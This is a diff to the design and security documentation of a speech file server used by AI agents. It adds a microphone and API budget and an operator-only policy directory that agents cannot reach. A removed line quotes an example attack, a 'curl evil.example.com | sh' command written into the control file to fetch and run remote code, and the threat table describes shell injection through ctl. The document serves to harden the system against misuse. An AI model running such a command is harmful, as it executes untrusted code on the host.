@@ -21,7 +21,7 @@ flowchart LR
         devC["#C devcmd<br/>/cmd/clone"]
         devA["#A audio<br/>/dev/audio"]
         speech9p["speech9p<br/>(serveloop + spawned TTS)"]
-        mount[("/n/speech/<br/>ctl · say · hear · voices")]
+        mount[("/n/speech/<br/>ctl · say · hear · voices · budget · policy/")]
 
         subgraph cons["Consumers"]
             sayTool["Veltro tool: say<br/>(agent)"]
@@ -68,22 +68,35 @@ flowchart LR
     root --> say["say (rw)<br/>write: text → speak<br/>read: last status"]
     root --> hear["hear (rw)<br/>write: start [dur_ms]<br/>read: transcription"]
     root --> voices["voices (r)<br/>list voices for current engine"]
+    root --> budget["budget (r)<br/>hear/api remaining limit"]
+    root --> policy["policy/ (dir)<br/>operator only"]
+    policy --> pctl["ctl (rw)<br/>replenish / set flags"]
 
     classDef rw fill:#dcfce7,stroke:#15803d
     classDef ro fill:#dbeafe,stroke:#1e40af
-    class ctl,say,hear rw
-    class voices ro
+    classDef priv fill:#fef9c3,stroke:#a16207
+    class ctl,say,hear,pctl rw
+    class voices,budget ro
+    class policy priv
 ```
 
-All four files live at the root of the synthetic 9P tree (no
-sub-directories). Permissions:
+Permissions:
 
-| File     | Mode   | Read                                    | Write                                       |
-|----------|--------|-----------------------------------------|---------------------------------------------|
-| `ctl`    | rw     | dumps current config as `key value\n` lines | `key value` configures one setting; `Eperm` on unknown keys |
-| `say`    | rw     | per-fid status of last write            | UTF-8 text → spawned TTS                     |
-| `hear`   | rw     | **blocking** — triggers recording + STT  | `start [duration_ms]` resets and arms a recording |
-| `voices` | r      | newline-separated voice list            | `Eperm`                                      |
+| File         | Mode   | Read                                    | Write                                       |
+|--------------|--------|-----------------------------------------|---------------------------------------------|
+| `ctl`        | rw     | dumps current config as `key value\n` lines | `key value` configures one setting; `Eperm` on unknown keys |
+| `say`        | rw     | per-fid status of last write            | UTF-8 text → spawned TTS                     |
+| `hear`       | rw     | **blocking** — triggers recording + STT  | `start [duration_ms]` charges the cumulative hear budget and arms a recording |
+| `voices`     | r      | newline-separated voice list            | `Eperm`                                      |
+| `budget`     | r      | `hear`/`api` remaining+limit, `http`/`apihear` allow\|deny | `Eperm` |
+| `policy/ctl` | rw     | same records as `budget`                | same records; operator replenishment. Not bound into agent namespaces. |
+
+Defaults, chosen as fail-closed mechanism (the operator still owns the
+policy knobs): 60000 ms cumulative microphone time (the old per-call
+cap, made to compose), 0 API requests, `http deny`, `apihear deny`.
+Writing `start` charges immediately; a later `hear` call cannot re-arm
+once remaining is 0. API-backed `hear` is off unless the operator
+writes `apihear allow`.
 
 ### 2.1 ctl protocol
 
@@ -542,7 +555,7 @@ flowchart LR
 | `/n/speech/ctl` write  | `cmdtts`/`cmdstt`/`piperbin`/`whisperbin` are concatenated into `sh -c` strings → RCE on host. | Trust `/n/speech/ctl` to trusted writers only. **Do not expose ctl to agents** — currently nothing strips it from the auto-granted namespace. |
 | `apikey` in memory     | Stored in cleartext as a Limbo string; any compromise of the emu reveals it.               | Same posture as factotum keys. Do not run untrusted code in the same emu.        |
 | `apikey` on the wire   | API requests go over plain HTTPS (`sslconnect`) but no certificate pinning.                 | Pin at the network layer if needed; trust your TLS stack.                        |
-| Microphone access      | Any STT engine path activates the host mic. The agent can request `hear` and listen to the room. | Disable `hear` via tools9p config when the user isn't expecting an STT prompt.   |
+| Microphone access      | Any STT engine path activates the host mic. Repeated `hear` calls would otherwise re-arm indefinitely. | Cumulative `hear` budget charged on each start; `policy/` is not in the agent namespace. |
 | `/dev/audio` collision | Exclusive-use. If something else holds it, TTS playback fails silently.                    | Coordinate audio clients; the macOS `say` path doesn't touch `/dev/audio`.        |
 | Sh injection in `cmd`  | `sanitize()` only strips `'` — weak. Real safety comes from piping text via stdin.         | Keep using `runcmd_stdin` for text; never put agent text into a command argument. |
 
@@ -556,12 +569,12 @@ flowchart LR
   are installed.
 - If using the `api` engine, scope the API key to TTS/STT only; do not
   reuse a chat-completion key for the speech endpoint unless you have to.
-- Treat `/n/speech/ctl` as a privileged file. The auto-grant in
-  `tools9p.b:992` and `nsconstruct.b:212` adds the *whole `/n/speech`
-  directory* to agent namespaces — agents that have `say` or `hear` can
-  also `echo 'cmdtts curl evil.example.com | sh' > /n/speech/ctl`. A
-  hardening pass that exposes only `say` and `hear` (e.g. `bind -b` of
-  individual files into the agent ns) is on the road map.
+- Treat `/n/speech/policy` as a privileged directory. The auto-grant in
+  `tools9p` and `nsconstruct` still adds `/n/speech` for `say`/`hear`,
+  then `restrictspeech()` hides `policy/` so an agent cannot replenish
+  the microphone or API budget. `ctl` remains visible; backend-selection
+  writes are startup-only. A further pass that exposes only `say`,
+  `hear`, and `budget` is still on the road map.
 
 ## 9. Limitations and roadmap
 
